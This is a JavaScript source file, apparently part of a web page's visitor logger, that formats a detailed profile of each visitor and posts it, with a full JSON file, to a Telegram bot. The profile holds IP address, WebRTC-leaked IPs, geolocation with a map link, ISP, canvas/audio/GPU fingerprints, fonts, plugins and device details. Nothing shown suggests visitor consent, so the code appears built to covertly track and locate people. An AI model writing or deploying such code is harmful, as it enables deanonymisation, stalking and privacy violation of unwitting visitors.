export async function sendToTelegram(info) {
  const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN
  const CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID

  if (!BOT_TOKEN || !CHAT_ID) {
    console.error('Telegram credentials not configured')
    return
  }

  // Format the summary message
  const message = formatSummaryMessage(info)

  // Create detailed data file
  const fullData = JSON.stringify(info, null, 2)
  const blob = new Blob([fullData], { type: 'application/json' })
  const fileName = `visitor_${info.visitorId}_${Date.now()}.json`

  try {
    // First send the summary message
    const messageResponse = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: 'HTML',
        }),
      }
    )

    if (!messageResponse.ok) {
      console.error('Failed to send message to Telegram:', await messageResponse.text())
    }

    // Then send the file with all data
    const formData = new FormData()
    formData.append('chat_id', CHAT_ID)
    formData.append('document', blob, fileName)
    formData.append('caption', '📄 Complete visitor data (JSON format)')

    const fileResponse = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
      {
        method: 'POST',
        body: formData,
      }
    )

    if (!fileResponse.ok) {
      console.error('Failed to send file to Telegram:', await fileResponse.text())
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error)
  }
}

function formatSummaryMessage(info) {
  const batteryInfo = typeof info.battery === 'object'
    ? `${info.battery.charging ? '⚡ Charging' : '🔋 Discharging'} - ${info.battery.level}`
    : info.battery

  const webrtcIPs = Array.isArray(info.webrtcIPs)
    ? info.webrtcIPs.join(', ')
    : info.webrtcIPs

  // Create Google Maps link if we have coordinates
  const mapsLink = info.latitude !== 'N/A' && info.longitude !== 'N/A'
    ? `https://www.google.com/maps?q=${info.latitude},${info.longitude}`
    : 'N/A'

  // Format FingerprintJS components
  let fpDetails = ''
  if (info.fingerprintComponents) {
    const c = info.fingerprintComponents
    fpDetails = `
🔬 <b>Advanced Fingerprints:</b>
• Video Card: ${c.videoCard?.value || 'N/A'}
• Architecture: ${c.architecture?.value || 'N/A'}
• Color Gamut: ${c.colorGamut?.value || 'N/A'}
• Contrast: ${c.contrast?.value || 'N/A'}
• HDR: ${c.hdr?.value || 'N/A'}
• PDF Viewer: ${c.pdfViewerEnabled?.value || 'N/A'}
• Apple Pay: ${c.applePay?.value || 'N/A'}
• Audio Context: ${c.audio?.value?.state || 'N/A'}
`
  }

  return `
🔔 <b>NEW VISITOR DETECTED!</b>

⏰ <b>Timestamp:</b> ${info.timestamp}
🆔 <b>Unique Visitor ID:</b> <code>${info.visitorId}</code>
📊 <b>Confidence Score:</b> ${info.confidence}

━━━━━━━━━━━━━━━━━━━━━━
🌐 <b>IP & GEOLOCATION</b>
━━━━━━━━━━━━━━━━━━━━━━
• <b>IP Address:</b> <code>${info.ip}</code>
• <b>Location:</b> ${info.city}, ${info.region}
• <b>Country:</b> ${info.country} (${info.countryCode})
• <b>Postal Code:</b> ${info.postal}
• <b>ISP:</b> ${info.isp}
• <b>Organization:</b> ${info.org}
• <b>ASN:</b> ${info.asn}
• <b>Coordinates:</b> ${info.latitude}, ${info.longitude}
📍 <a href="${mapsLink}">📍 View Location on Google Maps</a>

━━━━━━━━━━━━━━━━━━━━━━
🌍 <b>LOCALE & TIMEZONE</b>
━━━━━━━━━━━━━━━━━━━━━━
• <b>Timezone:</b> ${info.timezone}
• <b>UTC Offset:</b> ${info.timezoneOffset} minutes
• <b>Language:</b> ${info.language}
• <b>All Languages:</b> ${Array.isArray(info.languages) ? info.languages.join(', ') : info.languages}

━━━━━━━━━━━━━━━━━━━━━━
💻 <b>DEVICE INFORMATION</b>
━━━━━━━━━━━━━━━━━━━━━━
• <b>Platform:</b> ${info.platform}
• <b>Screen Resolution:</b> ${info.screenResolution}
• <b>Screen Color Depth:</b> ${info.screenColorDepth}-bit
• <b>Viewport Size:</b> ${info.viewportSize}
• <b>Device Pixel Ratio:</b> ${info.devicePixelRatio}
• <b>Touch Points:</b> ${info.maxTouchPoints}
• <b>CPU Cores:</b> ${info.hardwareConcurrency}
• <b>Device Memory:</b> ${info.deviceMemory} GB
• <b>GPU/Renderer:</b> ${info.webglRenderer}
• <b>Battery:</b> ${batteryInfo}

━━━━━━━━━━━━━━━━━━━━━━
🌐 <b>BROWSER DETAILS</b>
━━━━━━━━━━━━━━━━━━━━━━
• <b>User Agent:</b> ${info.userAgent}
• <b>Vendor:</b> ${info.vendor}
• <b>Cookies Enabled:</b> ${info.cookiesEnabled}
• <b>Do Not Track:</b> ${info.doNotTrack}

━━━━━━━━━━━━━━━━━━━━━━
📡 <b>CONNECTION INFO</b>
━━━━━━━━━━━━━━━━━━━━━━
• <b>Type:</b> ${info.connectionType}
• <b>Downlink:</b> ${info.connectionDownlink} Mbps
• <b>Round-Trip Time:</b> ${info.connectionRtt} ms

━━━━━━━━━━━━━━━━━━━━━━
🔍 <b>FINGERPRINTS</b>
━━━━━━━━━━━━━━━━━━━━━━
• <b>Canvas:</b> ${info.canvasFingerprint}
• <b>Audio:</b> ${info.audioFingerprint}
• <b>WebRTC IPs:</b> ${webrtcIPs}
${fpDetails}
━━━━━━━━━━━━━━━━━━━━━━
🖋️ <b>DETECTED FONTS</b>
━━━━━━━━━━━━━━━━━━━━━━
${info.installedFonts}

━━━━━━━━━━━━━━━━━━━━━━
🔌 <b>BROWSER PLUGINS</b>
━━━━━━━━━━━━━━━━━━━━━━
${info.plugins}

━━━━━━━━━━━━━━━━━━━━━━
📍 <b>TRAFFIC SOURCE</b>
━━━━━━━━━━━━━━━━━━━━━━
• <b>URL:</b> ${info.url}
• <b>Referrer:</b> ${info.referrer}

━━━━━━━━━━━━━━━━━━━━━━
📄 <i>Complete JSON data attached below ⬇️</i>
`.trim()
}
